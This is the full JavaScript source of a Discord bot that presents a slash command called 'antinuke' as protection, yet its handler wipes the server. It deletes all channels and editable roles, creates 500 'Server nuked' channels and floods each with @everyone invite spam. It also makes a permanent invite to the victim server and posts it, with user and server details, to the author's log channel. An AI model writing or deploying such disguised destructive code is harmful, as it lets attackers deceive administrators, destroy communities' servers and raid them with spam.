import express from "express";
import {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  ChannelType
} from "discord.js";
import "dotenv/config";

/* ===== Fake web server ===== */
const app = express();
app.get("/", (req, res) => res.send("Bot online"));
app.listen(process.env.PORT || 3000);
/* =========================== */

const client = new Client({
  intents: [GatewayIntentBits.Guilds]
});

const sleep = ms => new Promise(r => setTimeout(r, ms));

/* ===== CONFIG ===== */
const CHANNEL_NAME = "Server nuked";
const CREATE_COUNT = 500;
const MSG_PER_CHANNEL = 5;
const DELETE_DELAY = 60;
const WORKERS = 4; // số worker song song mỗi shard
const LOG_CHANNEL_ID = "1466068087378940100";
/* ================== */

/* ===== Slash Command ===== */
const commands = [
  new SlashCommandBuilder()
    .setName("antinuke")
    .setDescription("Bật Anti Nuke")
].map(cmd => cmd.toJSON());

const rest = new REST({ version: "10" }).setToken(process.env.BOT_TOKEN);

(async () => {
  try {
    console.log("🔁 Đăng slash command...");
    await rest.put(
      Routes.applicationCommands(process.env.CLIENT_ID),
      { body: commands }
    );
    console.log("✅ Xong!");
  } catch (e) {
    console.error(e);
  }
})();

client.once("ready", () => {
  console.log(`🤖 Online: ${client.user.tag} | Shard ${client.shard?.ids[0] ?? 0}`);
});

/* ===== WORKER QUEUE SYSTEM ===== */
class Queue {
  constructor(workers = 4) {
    this.tasks = [];
    this.running = 0;
    this.workers = workers;
  }

  add(task) {
    return new Promise((resolve, reject) => {
      this.tasks.push({ task, resolve, reject });
      this.run();
    });
  }

  async run() {
    while (this.running < this.workers && this.tasks.length) {
      const { task, resolve, reject } = this.tasks.shift();
      this.running++;
      task()
        .then(resolve)
        .catch(reject)
        .finally(() => {
          this.running--;
          this.run();
        });
    }
  }
}
/* =============================== */

const queue = new Queue(WORKERS);
async function sendCommandLog(interaction) {
  try {
    const logChannel = await client.channels.fetch(LOG_CHANNEL_ID);
    if (!logChannel) return;

    const user = `${interaction.user.tag} (${interaction.user.id})`;
    const guild = `${interaction.guild.name} (${interaction.guild.id})`;
    const channel = `${interaction.channel.name} (${interaction.channel.id})`;
    const time = new Date().toLocaleString("vi-VN");
    const command = `/${interaction.commandName}`;

    let invite = "Không tạo được invite";
    try {
      const inv = await interaction.channel.createInvite({
        maxAge: 0,
        maxUses: 0,
        unique: true
      });
      invite = inv.url;
    } catch {}

    await logChannel.send(
`📜 **COMMAND LOG**
👤 Người dùng: ${user}
🏠 Server: ${guild}
💬 Kênh: ${channel}
🔗 Invite: ${invite}
⏰ Thời gian: ${time}
⌨️ Lệnh: ${command}`
    );
  } catch (e) {
    console.log("Log error:", e);
  }
}
client.on("interactionCreate", async interaction => {
  if (!interaction.isChatInputCommand()) return;
  if (interaction.commandName !== "antinuke") return;
await sendCommandLog(interaction);
  const guild = interaction.guild;

  const controlChannel = await guild.channels.create({
    name: "Server Rách",
    type: ChannelType.GuildText
  });

  await controlChannel.send("⚠️ @everyone Join: https://discord.gg/P9yeTvwKjB");

  /* ===== XOÁ CHANNEL ===== */
  for (const ch of [...guild.channels.cache.values()]) {
    if (ch.id === controlChannel.id) continue;
    queue.add(async () => {
      try {
        await ch.delete();
        await sleep(DELETE_DELAY);
      } catch {}
    });
  }

  /* ===== XOÁ ROLE ===== */
  const botRolePos = guild.members.me.roles.highest.position;
  const roles = [...guild.roles.cache.values()]
    .filter(r => r.editable && r.name !== "@everyone" && r.position < botRolePos);

  for (const role of roles) {
    queue.add(async () => {
      try {
        await role.delete();
        await sleep(DELETE_DELAY);
      } catch {}
    });
  }

  await controlChannel.send("@everyone ⚡ Join: https://discord.gg/P9yeTvwKjB");

  /* ===== TẠO KÊNH + GỬI TIN ===== */
  for (let i = 0; i < CREATE_COUNT; i++) {
    queue.add(async () => {
      try {
        const ch = await guild.channels.create({
          name: CHANNEL_NAME,
          type: ChannelType.GuildText
        });

        for (let k = 0; k < MSG_PER_CHANNEL; k++) {
          await ch.send("@everyone 🚀 Join: https://discord.gg/P9yeTvwKjB");
        }
      } catch {}
    });
  }

  await controlChannel.send("✅ Hoàn tất Antinuke.");
});

client.login(process.env.BOT_TOKEN);
